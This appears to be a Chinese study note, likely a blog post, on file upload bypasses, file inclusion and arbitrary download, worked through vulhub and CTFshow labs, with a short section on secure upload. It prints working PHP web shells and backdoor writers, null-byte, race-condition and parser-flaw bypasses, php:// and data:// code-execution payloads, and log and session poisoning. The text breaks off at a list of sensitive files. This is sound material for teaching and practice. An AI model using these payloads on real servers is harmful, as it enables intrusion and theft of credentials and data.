Word/Excel（xls、doc）：D0CF11E0\n\n\n上面的这些都是 16 进制的文件头标志，我们直接将这个加到文件前面更改类型是行不通的\n\n\n我们可以使用工具去修改文件头，我选择的是 010Editor\n\n\n\n然后这里就可以随便改文件头了，比如我们在前面添加 PNG 的文件头，这里不能直接复制字节然后粘贴\n\n\n首先将 光标移到第一位，然后选择 编辑，选择 插入/覆盖，选中 插入字节，然后选择从哪里开始插入，插入多少位，这里 每 8 字节代表一位，所以插入 4 位即可：\n\n\n\n\n然后点击插入，再将上面的 PNG 头复制粘贴进来即可：\n\n\n过滤机制，例如：\n12345if (!in_array($_FILES[&#x27;file&#x27;][&#x27;type&#x27;], [&quot;image/jpeg&quot;, &quot;image/jpg&quot;, &quot;image/png&quot;, &quot;image/gif&quot;])) &#123;      echo &quot;&lt;script&gt;black();&lt;/script&gt;&quot;;  &#125; else if (!in_array(bin2hex($bin), [&quot;89504E47&quot;, &quot;FFD8FFE0&quot;, &quot;47494638&quot;])) &#123;      echo &quot;&lt;script&gt;black();&lt;/script&gt;&quot;;  &#125;\n\n\n这个方式最常用的还是使用 GIF 绕过，因为它的文件头比较好写，不用使用工具改，直接将 GIF89a 字符串添加到文件开头即可\n12GIF89a&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;\n\n\n5.黑名单绕过\n\n\n黑名单顾名思义就是禁止不合规的后缀名进行上传，但是这种方法并不安全，我们可以通过很多方式进行绕过，比如不在黑名单上的后缀名但可以解析成 php 的，也可以尝试双写、大小写、配置文件等\n\n\n我们可以使用 fuzzdb 这个字典（ https://github.com/fuzzdb-project/fuzzdb ），然后通过 bp 抓包进行爆破，看返回长度，有没有能绕过的后缀\n\n\n如果黑名单过滤文件后缀，不是不让上传，而是替换为空，例如：\n12345$blacklist = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;, &quot;ini&quot;);  $name = str_ireplace($blacklist, &quot;&quot;, $name);  if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_PATH . $name)) &#123;      $is_upload = true;  &#125;\n\n\n那么我们就可以进行双写绕过：pphphp\n\n\n6.条件竞争\n\n\n之所以会出现这个绕过方法，是因为编写代码中存在逻辑缺陷，他是先进行上传然后在进行比较最后删除，只不过代码运行的速度非常快，不容易看出来，这种缺陷黑盒是测不出来的，我们只能手动试一下这个方法，前面几种可能现在都用不到了，这个或许还能用到\n\n\n过滤机制，例如：\n123456789101112131415161718192021if (!empty($_POST[&#x27;submit&#x27;])) &#123;      $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);      $ext = pathinfo($name)[&#x27;extension&#x27;];      $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $name;      $whitelist = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;,&#x27;jpeg&#x27;);  \t// 先执行move_uploaded_file()函数上传文件    if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_PATH . $name)) &#123;  \t    // 再判断后缀是否违规        if(in_array($ext,$whitelist))&#123;              $rename_file = rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$ext;              $img_path = UPLOAD_PATH . &#x27;/&#x27;. $rename_file;              rename($upload_file, $img_path);              $is_upload = true;          &#125;else&#123;  \t        // 如果后缀违规，删除上传文件            echo &quot;&lt;script&gt;black();&lt;/script&gt;&quot;;              unlink($upload_file);          &#125;      &#125;  &#125;\n\n\n绕过步骤：我们手中现在有一个 1.php 文件，它的作用就是被访问时，就会创建一个后门\n1&lt;?php fputs(fopen(&#x27;xiao.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;);?&gt;\n\n\n首先我们要确定的就是上传文件的路径，然后不断地往服务器上传这个 php 文件，这里需要使用 BP 的 Intruder 模块，按照如下设置让他一直上传，这里推荐先进行访问那个上传文件的路径，然后在进行重复上传，设置如下（两个是同样的设置，就让他一直上传访问就行）\n\n\n\n然后我们在访问 xiao.php 那个路径，不断地刷新，等待奇迹即可\n\n\n7.系统特性绕过\n\n系统特性的绕过，比如 Windows 对文件大小写不敏感，而 Linux 对文件大小写敏感，所以导致服务器搭载到 Windows 上可能被大小写绕过\n\n8.00 截断\n\n\n当 PHP 版本小于 5.3.4，并且 magic_quotes_gpc = off 时，该漏洞生效\n\n\n00 截断产生的原因是因为 PHP 内核是由 C 语言实现的，所以使用了 C 语言中的部分字符串处理函数。比如在连接字符串时，0 字节（\\x00）会作为字符串结束，导致后面的字符串在实际解析时失效。\n\n\n这里用靶场演示一下。过滤机制采用的是白名单过滤后缀名，只允许上传图片类型的文件\n123456789101112131415$name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);  $info = pathinfo($name);  $ext = $info[&#x27;extension&#x27;];  $whitelist = array(&quot;jpg&quot;, &quot;jpeg&quot;, &quot;png&quot;, &quot;gif&quot;);  if (in_array($ext, $whitelist)) &#123;        $filename = rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;      $des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . $filename;            if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;  \t    $is_upload = true;  \t&#125; else &#123;  \t    echo &quot;&lt;script&gt;black();&lt;/script&gt;&quot;;  \t&#125;&#125;\n\n\n可以看到这里文件上传的路径 $des 为传入的 road 下面的 $filename\n\n\n也就是说这个 road 参数是我们可控的，并且这里的 $filename 是一个随即名字拼接在这里，然后将原本的文件相当于重命名了\n\n\n那这里我们就可以尝试 00 截断，将 php 文件重命名为 1.jpg，然后在 road 参数那里重命名为 1.php%00 将后面的内容截断，最后上传的文件名就是 1.php 了\n12345678910111213# GET参数00截断// 原本逻辑?road=xxx/1.php  --&gt;  $des=xxx/1.php/xxx.jpg// 截断逻辑?road=xxx/1.php%00  --&gt;  $des=xxx/1.php%00/xxx.jpg  --&gt;  $des=xxx/1.php# 文件名00截断// 原本逻辑name=1.php  --&gt;  拦截// 00截断name=1.php\\x00.jpg  --&gt;  $ext=jpg, $name=1.php  --&gt;  $filename=xxx.jpg\n\n\n这里因为一个重命名操作，所以没办法使用文件名截断，那我们就只能在 road 参数中截断：\n\n\n\nPOST 00 截断\n\n\n使用 POST 将 road 参数传入拼接，思路和上一关一样，但是要注意，我们 使用的 00 截断是%00 解码后的结果：\n12345678// GET传参http://xxx/upload/1.php%00.jpg这里使用的%00它会自动解码一次// POST传参http://xxxupload/1.php%00.jpg这里使用的%00需要我们手动进行一次解码才能够正确截断！\n\n\n所以我们这里直接添加%00 它是不行的，需要手动 URL 解码一次\n\n\n\n解码之后这里就像消失了一样，但实际上并没有，发包访问，成功解析\n\n\n9.二次渲染\n\n\n有些网站在我们上传图片后，会对图片进行处理，二次渲染到前端页面，这个过程会导致上传的图片与原先的图片上的信息不一致，因此图片马可能会失效，我们可以将木马写到网站不会处理的地方，绕过处理实现文件上传漏洞\n\n\n比如，我上传一个正常的文件，它渲染到前端之后我们将其下载下来比较前后的文件大小：\n\n\n\n可以看到啊两个文件的大小差距非常大，说明服务器对文件做了压缩删减了，这时我们拿出 010Editor 进行分析：\n\n\n\n选择右上角的比较文件，然后选择两个文件，点击比较：\n\n\n\n就可以看到两个文件的差异了：\n\n\n\n我们选择比较他们相同的部分，看看哪里没有被服务器删除：\n\n\n\n现在标蓝色的位置就是他们的匹配项，也就是没有改变的地方，那我们可以选择将一句话木马写到这些位置：\n\n\n\n因为这个靶场有文件包含漏洞，我们利用这个，访问我们上传的图片马，并在 post 上连接我们的密码进行系统命令\n\n\n成功执行！\n\n\n10.函数缺陷绕过\n\n\n在 PHP 5.3.4 以下的版本（不确定），move_uploaded_file($temp_file, $ img_path)函数存在解析漏洞。 如果网站使用了该函数，并且允许用户对上传文件进行重命名，那么可以通过该漏洞尝试绕过黑名单后缀名检测，造成文件上传漏洞。\n\n\n这里我们给出源码提示，然后我们可以控制上传文件名，但这里 php 版本不适合用 00 截断\n\n\n所以我们可以利用 move_uploaded_file() 的函数缺陷，如果上传的文件名最后存在 /.，那么就它实际命名时就会当成 / 前面的部分，从而绕过黑名单检测：\n\n\n\n成功解析！\n\n\n二、漏洞复现（中间件&amp;第三方组件）\n1.Apache HTTPD 换行解析漏洞（CVE-2017-15715）\n\n\nApache HTTPD 是一款 HTTP 服务器，它可以通过 mod_php 来运行 PHP 网页。\n\n\n漏洞影响版本：2.4.0~2.4.29\n\n\n漏洞描述：在解析 PHP 时，1.php\\x0A 将被按照 PHP 后缀进行解析，导致绕过一些服务器的安全策略\n\n\n漏洞利用条件：\n\nApache 版本符合\n存在文件上传点\n能够自定义服务器保存文件名\n\n\n\n可以看到这个利用条件也是非常苛刻，所以只当了解原理即可，实战很难遇到\n\n\n漏洞复现：docker 启动 vulhub 环境，漏洞地址：/vulhub/httpd/CVE-2017-15715\n\n\n\n通过指纹识别到服务器为 Apache 2.4.10，符合漏洞版本：\n\n\n\n然后上传一个 1.php 文件，抓包转到 Repeater 模块：\n\n\n\n正常上传 php 文件是无法上传的，提示 bad file：\n\n\n\n然后我们在上传重命名的文件名 evil.php 处加一个空格，方便我们之后十六进制更改\n\n\n转到十六进制，将刚刚添加的空格处（0x20）改为 0x0A：\n\n\n\n然后上传，可以看到没有错误提示，说明上传成功：\n\n\n\n之后访问 /evil.php%0a 即可访问到我们上传的 php：\n\n\n成功解析\n\n\n2.Nginx 文件名逻辑漏洞（CVE-2013-4547）\n\n\nNginx 是一个 Web 服务器，可用作反向代理、负载均衡器、邮件代理和 HTTP 缓存。\n\n\n漏洞影响版本：Nginx 0.8.41 1.4.3/1.5.0 1.5.7\n\n\n漏洞描述：这个漏洞主要是请求 URL 的解析不正确，导致用户请求的文件名检索不正确，从而导致权限绕过和代码执行。当 Nginx 匹配到.php 结尾的请求时，才会发送给 fastcgi 进行解析，但是当我们请求 1.gif [0x20][0x00].php 时，这个 URL 可以匹配上正则.php$，也能够解析为 php 文件。因此我们只需要上传一个空格结尾的文件，即可使其解析为 PHP 文件\n\n\n漏洞复现：启动 vulhub 靶场，地址为：/vulhub/nginx/CVE-2013-4547：\n\n\n\n然后我们将 php 文件改成 gif 上传，抓包转到 Repeater 模块：\n\n\n\n然后将文件名 1.gif 后面加两个空格（0x20）转到十六进制编辑，找到我们添加的空格处，将第二个 0x20 改为 0x00：\n\n\n\n然后发包：\n\n\n\n成功上传，复制上传路径，然后访问再次抓包：\n\n\n\n转到 Repeater 模块，重复刚才的操作在 1.gif 后面添加两个空格以及 .php，然后转到十六进制将第二个空格改为 0x00，然后发包：\n\n\n\n成功解析成 php 文件\n\n\n3.Nginx 解析漏洞\n\n\n漏洞影响版本：全版本\n\n\n漏洞描述：该漏洞与 Nginx、PHP 版本无关，属于 用户配置不当造成 的解析漏洞。该漏洞存在的原因是 Nginx 在配置中对文件扩展名的处理方式。当请求一个具有多个扩展名的文件（如 file.jpg.php）时，Nginx 可能会 根据最后一个扩展名来处理\n123456location ~ \\.php$ &#123;    fastcgi_pass   127.0.0.1:9000;    fastcgi_index  index.php;    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;    include        fastcgi_params;&#125;\n\n\n漏洞复现：启动 vulhub 靶场，地址为：/vulhub/nginx/nginx_parsing_vulnerability\n\n\n我们上传一个正常的 gif 文件，然后在最末尾添加 php 代码：\n\n\n\n发包上传，得到上传路径：\n\n\n\n直接访问没有问题，但是我们在后面加上一个/.php 后缀，他就会将其解析成 php 文件\n\n\n\n成功解析！\n\n\n4.编辑器&amp;上传相关&amp;第三方处理引用\n\n这一部分产生文件上传的原因就是由于程序或网站引用第三方的组件，最常见的就是编辑器，像 ueditor、kindeditor、fckeditor 等\n引用到外部的第三方编辑器实现文件上传，编辑器的安全即使上传安全\n但是由于现在编辑器的漏洞越来越少，而且很多都不采用编辑器组件，所以实战碰到的机会不大，主要是理解漏洞产生的思路\n参考文章：\n\n渗透测试-Ueditor 漏洞捡漏-腾讯云开发者社区-腾讯云\n常见编辑器漏洞汇总【超全】（转载）-CSDN 博客\n实战纪实 | 编辑器漏洞之 Ueditor-任意文件上传漏洞 （老洞新谈）_ueditor 漏洞-CSDN 博客\n\n\n\n5.CMS 源码&amp;上传相关&amp;已知识别到利用\n\n有的网站也会直接采用第三方的 CMS，比如一些第三方的 OA 系统：泛微、通达、用友等等\n那这时候我们就是已知 CMS 源码架构，一般自己挖出或审出漏洞的几率是极小的\n所以遇到这类网站，我们一般就是尝试去看看是否有已知的漏洞可以利用\n\n6.通达 OA 任意文件上传\n\n\n这里的演示环境是通达 OA-V11.2 版本，这里建议是安装到刚刚的虚拟机环境中\n\n\n安装完之后就直接配置\n\n\n\n等它安装完之后就可以直接访问了\n\n\n\n对于这类公开的 CMS，我们可以信息收集到它的版本这些，然后到网上搜一下是否有对应的漏洞\n\n\n或者直接利用专门的漏洞扫描工具直接开扫即可，比如这里 One-Fox 上就有 Liqun 工具可以扫描：\n\n\n\n这里扫到了存在文件上传漏洞，然后也成功上传了 shell，直接连就好了\n\n\n三、安全上传\n1.目录权限\n\n在文件属性安全那里将读写权限取消，那么不管他传什么样的后门，都执行不了，访问 403\n这种情况有小概率能绕过，需要将文件上传到有读写权限的地方\n\n2.字节流传输数据\n\n\n如果网站选用字节流传输的方式，那么不管我们传什么类型的文件，他只 接受文件数据，然后按照后端 定义好的安全协议进行解析，假如它定义的只接受图片，那么即使我们上传 php 也会强制解析成图片（解析后的是破损的，什么用都没有），只有上传图片才会正确解析\n\n\n最常见的例子就是在图片上传点，我将图片转为字节流，然后采用 Base64 编码传输到后端，后端添加协 data:image/png;base64\n1231. 上传图片 --&gt; 图片数据 --&gt; Base64值2. 显示图片 --&gt; Base64值 --&gt; 解码解析还原3. 固定协议解析上传文件 --&gt; 即使有上传漏洞也无法利用\n\n\n后端处理的关键代码：\n1$base64Data = base64_encode(file_get_contents($tmpFilePath));\n\n\n上传一个图片：\n\n\n\n它上传的格式是下面所示的 Base64 编码 值，然后解码之后正常显示\n\n\n而上传 php 文件之后是这个样子\n\n\n\n可以看到，即使上传成功，也解析不了\n\n\n3.分站存储\n\n\n文件和源码存储到不同的服务器，该服务器仅用于存储文件，所以即使我们成功上传后门，得到的也不是目标网站权限，而且一般这种分站存储都是配合目录权限操作的，我们的木马大概率链存储文件的地方都连不上去\n\n\n将上传的文件和网站源码分开放，但仍处于同一服务器，结构如下：\n123456789101112服务器A├── root/                 │   ├── www/              # 网站源码目录│   │   ├── static/          │   │   ├── app/│   │   │   └──index.php│   │   └── templates/服务器B├── upload/               # 文件上传目录│   ├── 1.php│   └── 1.jpg\n\n\n4.OSS 云存储\n\n利用云厂商的 OSS 技术，将文件存储到 Bucket 桶中，OSS 对象存储的文件只做存储，不做处理，访问的时候它 要么下载，要么查看，压根不会执行，即使它执行了，你也是在和云厂商对抗，而不是目标网站，所以上传 shell 基本没有啥用了\n\n5.总结\n\n遇到这四个尽快跑路，基本上传失败或者连不上去，也就第一个能有小概率绕过，但概率很小\n\n文件包含\n一、基础知识\n\n\n原理：程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程一般被称为文件包含。\n\n\n在文件包含的过程中，如果文件能进行控制，则存在文件包含漏洞\n\n\n在 PHP 中，关于文件包含的函数有：\n1234include()include_once()require()require_once()\n\n\n如果上述传入的这些函数的 参数可控，那么就有可能存在文件包含漏洞\n\n\n文件包含漏洞分为两大类：\n\n本地包含：Local File Include（LFI），即只能包含本地拥有的文件\n远程包含：Remote File Include（RFI），即可以加载远程文件进行包含\n\n\n\n差异原因：代码过滤或者环境配置文件开关决定\n\n\n二、远程文件包含\n\n\n远程文件包含必须满足的条件：\n\n存在包含点\n没有代码过滤\n允许远程加载并执行远程文件\n\n\n\n那么对于 PHP 而言，需要配置选项 allow_url_include 和 allow_url_fopen 为 ON 状态，在小皮中，就要将远程文件和远程包含开启：\n\n\n\n不过这个默认是关闭的，实战中很少碰到\n\n\n三、本地文件包含\n\n比起 RFI，LFI 的利用条件就简单了很多，只需要有包含点即可\n本地文件包含分为两大类：\n\n有文件包含：配合文件上传，实现包含自定义文件\n无文件利用：\n\n包含日志文件利用\n包含 Session 文件利用\n伪协议利用\n\n\n\n\n\n四、伪协议\n1.基础知识\n\n\n\n主要协议有 file://、php://filter、php://input、zip://、data:// 等等\n\n\n参考文章：PHP 伪协议总结 - 个人文章 - SegmentFault 思否\n\n\n文件读取：\n1234567# 读取/etc/password文件，使用绝对路径！file:///etc/password# 读取phpinfo.php文件，并进行base64编码，使用相对路径！php://filter/read=convert.base64-encode/resource=phpinfo.phpfile:///var/log/nginx/access.log #日志读取\n\n\n文件写入：\n12345# 写入phpinfo.php文件，并进行base64编码 =&gt; 需要配合file_put_contents()函数使用php://filter/write=convert.base64-encode/resource=phpinfo.php# POST提交代码创建shell.php文件php://input POST:&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]);?&gt;&#x27;); ?&gt;\n\n\n代码执行：\n12345678# POST提交php代码php://input POST:&lt;?php phpinfo();?&gt;# 执行php代码data://text/plain,&lt;?php phpinfo();?&gt;# 执行base64编码后的php代码data://text/plain;base64,PD9waHAgcGwaW5mbygpOz8%2b\n\n\n2.黑盒利用-vulnweb-有无文件包含\n\n\n黑盒发现主要通过观察参数传递的数据和文件名是否对应\n\n\n我们有这样一个网站： http://testphp.vulnweb.com/showimage.php\n\n\n现在它可以传入一个参数 file 去包含一个文件，现在我们就是一个黑盒，我们就可以尝试传入 ?file=showimage.php 看看能否包含当前文件：\n\n\n\n能够成功返回 showimage.php 的源码，一般来说网站的首页文件都是 index.php，那我们尝试包含一下：\n\n\n\n成功返回信息，同时，这里也暴露出了数据库配置文件的文件名，直接包含一下：\n\n\n\n成功得到数据库的账号和密码，接管数据库\n\n\n那这个靶场到这里就结束了，后续利用实战中可以尝试连数据库，或者利用伪协议上传马子都是 OK 的\n\n\n3.白盒利用-ctfshow-伪协议玩法\n\n白盒发现：\n\n可通过应用功能追踪代码定位审计\n可通过脚本特定函数搜索定位审计\n可通过伪协议玩法绕过相关修复等\n\n\nPHP：include、include_once、require、require_once\n\ninclude 在包含的过程中如果出现错误，会抛出一个警告，但程序继续执行\nrequire 函数出现错误时，会直接报错并退出和终止程序\n\n\nJava：java.io.File、java.io.FileReader 等\nASP.NET：System.IO.FileStream、System.IO.StreamReader 等\n\n五、CTFshow 演示\n1.CTFshow-78 http 伪协议\n\n\n这里就是直接把源代码给出来，然后让你分析绕过的：\n123456if(isset($_GET[&#x27;file&#x27;]))&#123;      $file = $_GET[&#x27;file&#x27;];      include($file);  &#125;else&#123;      highlight_file(__FILE__);  &#125;\n\n\n那这里什么都没过滤，就想用什么用什么了，可以远程包含尝试一下，也可以本地包含利用伪协议执行 php 命令\n\n\n我们这里就本地包含解题吧，一般读取文件都使用 php://filter 的这个协议，因为我们一开始并不知道当前目录的绝对路径\n\n\n所以这里可以先执行一个命令看看当前文件夹有哪些文件：php://input POST:&lt;?php system('ls');?&gt;：\n\n\n\n然后看到了 flag.php，那我们就直接尝试读取就好了：\n\n\n\n当然，这里也可以用 php://filter/read=convert.base64-encode/resource=flag.php 读取，然后 base64 解码即可：\n\n\n\n\n2.CTFshow-79 data 伪协议\n\n\n源码：\n1234567if(isset($_GET[&#x27;file&#x27;]))&#123;      $file = $_GET[&#x27;file&#x27;];      $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);      include($file);  &#125;else&#123;      highlight_file(__FILE__);  &#125;\n\n\n这里将 php 过滤了，我们用不了 php 伪协议了，同时 payload 中也不能包含 php 字段，那就使用 data 伪协议进行读取和写入：\n\n\n\n3.CTFshow-80、81 日志文件利用\n\n\n源码：\n12345678if(isset($_GET[&#x27;file&#x27;]))&#123;      $file = $_GET[&#x27;file&#x27;];      $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);      include($file);  &#125;else&#123;      highlight_file(__FILE__);  &#125;\n\n\n可以看到这题将 php 和 data 都禁用了，那上面的协议只用 file 可以用了（不考虑 zip 等）\n\n\n但是 file 只能读取绝对路径 的文件，这里我并不知道 flag.php 的绝对路径，靠猜显然是不可能的\n\n\n这时候我们就需要用到一些特殊的文件，比如日志文件\n\n\n为什么呢？因为日志文件很可能会记录我们的访问信息，比如 UA 头、IP、Cookie 等等信息，如果它记录了，那我们是不是可以尝试将 php 代码写到这些地方，让他包含执行呢？\n\n\n而且日志文件的绝对路径一般是默认的，但是需要结合搭载的服务器来看：Linux 服务器日志存储位置详解：/var/log/、Nginx、Apache、MySQL 等常见日志目录 – Linux 命令大全(手册)\n\n\n这里是 Nginx，所以我们尝试访问一下 Linux 下 Nginx 的默认日志路径：linux 查看 nginx 日志-CSDN 博客\n\n\n\n可以看到这里呢，是会记录我们的 UA 头信息的，那我们尝试将 php 代码放入 UA 头看它是否执行，直接抓包：\n\n\n\n然后放包，看日志：\n\n\n\n可以看到成功执行我们的 php 代码，然后我们继续读取 fl0g.php：\n\n\n\n成功获得 flag\n\n\n4.CTFshow-82 Session&amp;条件竞争\n\n\n源码：\n12345678910if(isset($_GET[&#x27;file&#x27;]))&#123;      $file = $_GET[&#x27;file&#x27;];      $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);      include($file);  &#125;else&#123;      highlight_file(__FILE__);  &#125;\n\n\n现在过滤了 php、data、: 以及 .，所以能够使用的伪协议只有 file、zip 之类\n\n\n这题需要通过 SESSION 来实现文件上传，之后再包含利用\n\n\n造成利用的原因就是因为 PHP 中有一个 PHP_SESSION_UPLOAD_PROGRESS 选项\n\n\n在了解该选项之前，我们需要知道两个东西：\n\n\nSession 存储位置：\n\n\n\n与 Session 有关的几个 PHP 选项：\n\n\n\n\n\n然后，我们在了解一个 PHP 中的 PHP_SESSION_UPLOAD_PROGRESS 选项，简单来说就是 可以通过这个选项让服务器保存我们自定义的 SESSION 会话文件\n\n\n但是由于上述条件，保存的内容会被立刻清除，和我们文件上传时一样，它是先上传再清除的，所以存在一个时间间隙我们可以利用\n\n\n于是我们可以写这样一个 html 代码：\n12345678910&lt;!doctype html&gt;    &lt;html&gt;    &lt;body&gt;        &lt;form action=&quot;http://xxx.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;            &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php system(&#x27;ls&#x27;);?&gt;&#x27;)?&gt;&quot; /&gt;            &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;              &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;        &lt;/form&gt;    &lt;/body&gt;    &lt;/html&gt;\n\n\n这个代码就是去上传一个 SESSION，然后里面的内容就是当这个 SESSION 文件被访问时，就创建一个 shell.php 后门\n\n\n然后把他搭载到本地，抓包，自定义 PHPSESSID，然后放入 Intruder 模块不断放包：\n\n\n\n\n这里弄好之后，我们进入 ctfshow 那里访问 sess_lingaaa 文件，这个路径一般是默认路径（上面提到过）：\n\n\n\n看到空白页面，没有保存就说明成功创建了 sess_lingaaa 文件，但是这里内容是空的，说明内容被删除了\n\n\n所以我们要持续的访问，在他还没删除的时候访问到，这样就可以创造 shell.php 了，这里同样用 bp 进行持续访问\n\n\n\n最后访问 shell.php 即可，更详细的文章：ctfshow-web 入门-文件包含（web82-web86）条件竞争实现 session 会话文件包含_ctfshow web82-CSDN 博客\n\n\n5.CTFshow-87 php://filter/write&amp;加密编码\n\n\n源码：\n12345678910111213if(isset($_GET[&#x27;file&#x27;]))&#123;      $file = $_GET[&#x27;file&#x27;];      $content = $_POST[&#x27;content&#x27;];      $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);      file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);      &#125;else&#123;      highlight_file(__FILE__);  &#125;\n\n\n过滤了很多东西，然后 file 也比较难用，基本读不了有后缀的文件，那日志包含不行，Session 应该可以，但是也难用\n\n\n我们注意到这里 有个 file_put_contents() 函数和 urldecode($file) 函数\n\n\n出现这两个函数我们就要注意了，第一个函数我们就可以使用 php://filter/write 去写入内容，第二个函数我们可以去绕过禁止 php 字段出现\n\n\n我们知道如果我们 GET 传入的参数值是经过 URL 编码的，那么浏览器就会帮我们自动解码一次\n\n\n但是第二个函数的出现，就会让服务器再帮我们解码一次，因此我们本地可以传入两次 URL 编码的 payload，这样浏览器解码后还是 URL 编码的值，绕过黑名单检测，服务器再解码一次就是我们真正写入的值了\n\n\n同时，我们也需要注意这里 有个 die() 函数需要绕过，不然我们就没法执行传入的 content\n\n\n所以我们的 payload 为 php://filter/write=convert.base64-decode/resource=1.php：\n\n\n\n然后 POST 传入 content，这里需要将 php 语句进行 base64 编码，需要注意的是：\n\n编码后的字节数要符合要求，否则会报错：\n编码中不能出现 + 号，否则上传成功也无法执行\n\n\n\n那我们 content 内容就为：&lt;?php @eval($_POST[a]);?&gt;，然后 Base64 编码：\n\n\n\n前面加上两个 a 是为了凑够字节数，然后访问 1.php，传入 a=system('ls');：\n\n\nbase64可以绕过die函数。因为base64编码范围是 0 ～ 9,a ～ z,A ～ Z,+,/ ，所以除了这些字符，其他字符都会被忽略掉。\nbase64过滤之后就只有(phpdie)6个字符了，base64要求把每三个8Bit的字节转换为四个6Bit的字节，所以这里也要凑够四个字节的倍数，避免base64解码出问题，这里加上两个字符即可。\n\n\n\n接下来就可以看 flag 了：\n\n\n\n除了上述的使用 Base64 进行编码以外，还可以使用 ROT13 进行加密传输\n\n\npayload 为 php://filter/write=string.rot13/resource=2.php 两次 URL 编码，content 的值为 ROT13 编码后的一句话木马\n\n\n\n\n6.CTFshow-88\n\n\n源码\n123456789if(isset($_GET[&#x27;file&#x27;]))&#123;      $file = $_GET[&#x27;file&#x27;];      if(preg_match(&quot;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i&quot;, $file))&#123;          die(&quot;error&quot;);      &#125;      include($file);  &#125;else&#123;      highlight_file(__FILE__);  &#125;\n\n\n这里过滤了 php 以及一堆符号，但是没过滤 data，所以尝试用 data 伪协议去执行代码\n\n\n尝试使用 payload 为：data://text,plaintext;base64,PD9waHAgc3lzdGVtKCdscycpOz8+，这是不行的，因为里面包含了字符 +，会被过滤\n\n\n所以这里 base64 编码的值不能包含符号，那就在左右添加值来生成一个没有符号的 base64 编码\n\n\n最终我们生成的 payload 为 data://text/plain; base64, YWE8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4xMjM0NTU，即 aa  123455 和 12  成功绕过\n\n\n\n7.CTFshow-117 php://filter/write&amp;新的算法\n\n\n源码：\n1234567891011highlight_file(__FILE__);  error_reporting(0);  function filter($x)&#123;      if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;          die(&#x27;too young too simple sometimes naive!&#x27;);      &#125;  &#125;  $file=$_GET[&#x27;file&#x27;];  $contents=$_POST[&#x27;contents&#x27;];  filter($file);  file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);\n\n\n这关过滤了很多东西，甚至连 base64 和 rot13 都过滤了，而且还有个 die() 函数需要绕过，那基本上只能加密这些了，但是没过滤 php，所以可以使用 php 伪协议\n\n\n我们还有一种 php 伪协议的过滤器 convert.iconv.*，详见：php://filter 的各种过滤器_php 过滤器转换器常见-CSDN 博客\n\n\n这里可以把 content 的内容从 UCS-2LE 编码转换为 UCS-2BE 编码，绕过过滤和 die() 函数\n\n\n写一个脚本将 contents 的内容转一下：\n12$result = iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;, &#x27;$contents&#x27;);echo $result;\n\n\n所以 payload 为：php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=1.php，contents=?&lt;hp pvela$(P_SO[T]a;)&gt;?：\n\n\n\n成功执行，然后直接看 flag：\n\n\n\n文件下载\n一、文件安全-下载&amp;删除-黑白盒\n1.任意文件下载\n原理：\n\n下载 = 读取\n常规下载 URL：http://www.xiaodi8.com/upload/123.pdf\n\n直连下载，如果访问 http://www.xiaodi8.com/upload/1.php，他可能就不是下载文件，而是解析 php 代码了\n\n\n可能存在安全 URL：http://www.xiaodi8.com/download.php?file=123.pdf\n\n而如果是这种，就说明他是传参进去的，那就已经 固定好下载协议 了，如果没做过滤这些，他就会去尝试下载其他文件\n\n\n当下载文件时是通过参数传递的文件名，那就可能存在下载安全\n利用：常规下载敏感文件（数据库配置，中间件配置，系统密钥等文件信息）\n比如 Linux 下，参考文章：Linux 常见的敏感目录 - 楼–楼 - 博客园\n\n123456/etc/passwd: 